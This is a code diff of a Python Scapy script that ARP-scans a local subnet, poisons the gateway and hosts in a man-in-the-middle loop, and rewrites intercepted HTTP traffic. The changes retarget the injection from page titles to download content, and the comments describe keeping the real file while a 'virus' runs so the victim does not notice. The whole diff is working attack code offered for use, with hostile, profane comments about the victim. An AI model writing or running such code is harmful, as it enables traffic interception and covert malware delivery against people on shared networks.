@@ -41,7 +41,7 @@ print("HOST IP "+ gw_ip)
 
 latency = 5
 counter = 0
- 
+
 def scan(range):
     pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=range)
     result = srp(pkt,verbose=0,timeout=5)[0]
@@ -71,7 +71,7 @@ def heal(sn_ip, recv_ip):
 targets = scan("192.168.1.0/24")
 
 def ManInTheMiddleNetwork():
-    for i in range(10):
+    for i in range(999):
         while True:
             for target in targets:
                 poison(gw,target)
@@ -97,23 +97,23 @@ def ManInTheMiddleNetwork():
 
 def process_packet(pkt):
     if(str(pkt.payload).__contains__('text/html')):
-        if(str(pkt.payload).__contains__('<title>')):
+        if(str(pkt.payload).__contains__('<download>')):
             modifyPacketAndSend(pkt)
             return
-    pkt.send()
+    send(pkt)
 def modifyPacketAndSend(pkt):
     output=pkt
     load = str(pkt.payload)
     #Make the change
-    start = load.find('<title>')
-    end = load.find('</title>')
-
-    change = "<title>GET FUCKED"
-
-    #before making changes I need to save the
-    #actual download so then I would download it later
-    #and the stupid karen wont know a thing
+    start = load.find('<download')
+    end = load.find('</download')
+    #save the actual download so I
+    #would be able to download it
+    #for the user when the virus is running
+    #and so the stupid karen wont know
+    changed = load[start:end]
     
+    change = "<download>GET FUCKED"
 
     load = load[0:start] + change + load[end:]
 
@@ -123,7 +123,7 @@ def modifyPacketAndSend(pkt):
     output[TCP].load = load
     output.show2()
 
-    output.send()
+    send(output)
     pass
 
 def activate_attack():
